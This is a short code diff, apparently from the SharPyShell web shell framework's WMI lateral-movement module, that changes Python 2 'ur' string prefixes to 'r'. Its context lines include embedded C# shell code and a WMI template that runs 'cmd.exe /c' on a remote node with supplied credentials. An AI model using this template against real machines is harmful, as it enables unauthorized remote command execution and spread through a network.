@@ -61,7 +61,7 @@ class Lateral_wmi(Module):
 
     """
 
-    _runtime_code = ur"""
+    _runtime_code = r"""
                     using System;using System.IO;using System.Diagnostics;using System.Text;
                     public class SharPyShell
                     {                    
@@ -104,7 +104,7 @@ class Lateral_wmi(Module):
                     }
                     """
 
-    _runtime_code_runas = ur"""
+    _runtime_code_runas = r"""
                     using System;using System.IO;using System.Diagnostics;using System.Text;
                     using System.Runtime.InteropServices;using System.Security.Principal;using System.Security.Permissions;using System.Security;using Microsoft.Win32.SafeHandles;using System.Runtime.ConstrainedExecution;
 
@@ -283,7 +283,7 @@ class Lateral_wmi(Module):
     __default_local_user = ''
     __default_local_password = ''
     __default_local_domain = ''
-    __wmi_code_arguments = ur'/node:%s /user:""%s"" /password:""%s"" process call create ""cmd.exe /c %s""'
+    __wmi_code_arguments = r'/node:%s /user:""%s"" /password:""%s"" process call create ""cmd.exe /c %s""'
 
     def __run_as_current_user(self, wmi_code_arguments):
         request = self._create_request([wmi_code_arguments, 'current_user'])
